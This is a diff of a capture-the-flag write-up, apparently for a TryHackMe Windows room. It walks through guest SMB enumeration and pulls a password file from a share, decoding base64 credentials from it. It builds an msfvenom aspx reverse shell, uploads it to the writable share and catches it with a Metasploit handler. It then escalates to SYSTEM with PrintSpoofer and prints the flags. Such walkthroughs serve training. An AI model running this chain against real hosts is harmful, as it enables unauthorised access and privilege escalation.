@@ -172,7 +172,7 @@ No reply from 10.64.160.63
 └─$ rpcclient -U "" -N 10.64.160.63   
 Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
 ```
-**lets try seeing what we get as user 'guest' with crackmapexec**
+## **lets try seeing what we get as user 'guest' with crackmapexec**
 
 ```sh
 ┌──(kali㉿kali)-[~]
@@ -247,7 +247,8 @@ SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<ma
 [\] Closing connections..                                                                                   [|] Closing connections..                                                                                   [/] Closing connections..                                                                                   [-] Closing connections..                                                                                   [\] Closing connections..                                                                                   [|] Closing connections..                                                                                   [/] Closing connections..                                                                                   [-] Closing connections..                                                                                   [*] Closed 1 connections
 ```
 
-**Jackpot we see that the user guest doesnt require a password and that we can read and write to share nt4wrksv**
+## **Jackpot we see that the user guest doesnt require a password and that we can read and write to share nt4wrksv**
+
 ```sh
 ┌──(kali㉿kali)-[~]
 └─$ smbclient  //10.64.160.63/nt4wrksv -U guest% 
@@ -262,7 +263,7 @@ smb: \> get passwords.txt
 getting file \passwords.txt of size 98 as passwords.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
 ```
 
-**Nice we got password.txt lets look inside now**
+## **Nice we got password.txt lets look inside now**
 
 ```sh
 ┌──(kali㉿kali)-[~]
@@ -272,12 +273,12 @@ Qm9iIC0gIVBAJCRXMHJEITEyMw==
 QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
 ```
 
-**These look like they are b64 encoded the == gives it away lets check if thats the case** 
+## **These look like they are b64 encoded the == gives it away lets check if thats the case** 
 
 <img width="459" height="685" alt="image" src="https://github.com/user-attachments/assets/f5022efb-63eb-4981-bcc7-568df54d3503" />
 
-Looks like the first user-password combination is Bob - !P@$$W0rD!123
-and the second one is Bill - Juw4nnaM4n420696969!$$$
+## _Looks like the first user-password combination is Bob - !P@$$W0rD!123_
+## _and the second one is Bill - Juw4nnaM4n420696969!$$$_
 
 ```sh
 ┌──(kali㉿kali)-[~]
@@ -306,8 +307,8 @@ SMB         10.64.160.63    445    RELEVANT         nt4wrksv        READ,WRITE
 
 ```
 
-**Looks like they do not have any special privileges** 
-Lets run a vulnerability scan on nmap 
+## **Looks like they do not have any special privileges** 
+**Lets run a vulnerability scan on nmap **
 
 ```sh
 Nmap scan report for 10.67.190.109
@@ -343,9 +344,10 @@ Host script results:
 
 Nmap done: 1 IP address (1 host up) scanned in 98.68 seconds
 ```
-Found that the smb server is vulnerable to CVE-2017-0143
 
-lets create a shell.
+## **Found that the smb server is vulnerable to CVE-2017-0143**
+**lets create a shell.**
+
 ```sh
 ┌──(kali㉿kali)-[~]
 └─$ sudo su                                     
@@ -360,7 +362,7 @@ Payload size: 203846 bytes
 Final size of aspx file: 1030495 bytes
 Saved as: shell.aspx
 ```
-now we set up a listener on metasploit and put the shell in the smb share that we found earlier:
+## **now we set up a listener on metasploit and put the shell in the smb share that we found earlier:**
 
 ```sh
 msf6 > use exploit/multi/handler 
@@ -393,7 +395,7 @@ smb: \>
 
 meterpreter > 
 ```
-and it worked
+## **and it worked**
 
 ```sh
 meterpreter > whoami
@@ -477,7 +479,7 @@ more user.txt
 THM{fdk4ka34vk346ksxfr21tg789ktf45}
 ```
 
-**Looks like we got our first flag **
+## **Looks like we got our first flag **
 **THM{fdk4ka34vk346ksxfr21tg789ktf45}**
 - I am now gonna use winPEAS to elevate my privilage 
 
@@ -499,8 +501,8 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
 
-we have this SeImpersonatePrivilege enabled so lets see what we can use that for...
-Ill use https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0  
+**we have this SeImpersonatePrivilege enabled so lets see what we can use that for...**
+**Ill use https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0  **
 
 ```sh
 ┌──(kali㉿kali)-[~]
@@ -585,8 +587,8 @@ Mode                LastWriteTime         Length Name
 PS C:\inetpub\wwwroot\nt4wrksv> 
 ```
 
-After reading the documentation on the printspoofer64.exe ill try running it with either cm or powershell 
-
+**After reading the documentation on the printspoofer64.exe ill try running it with either cmd or powershell 
+**
 ```sh
 PS C:\inetpub\wwwroot\nt4wrksv> PrintSpoofer64.exe -i -c powershell
 
@@ -677,6 +679,7 @@ PS C:\users\Administrator\Desktop> more root.txt
 more root.txt
 THM{1fk5kf469devly1gl320zafgl345pv}
 ```
+**
 And there we go, 
 THM{1fk5kf469devly1gl320zafgl345pv}
-heres the root flag :D
+heres the root flag :D**
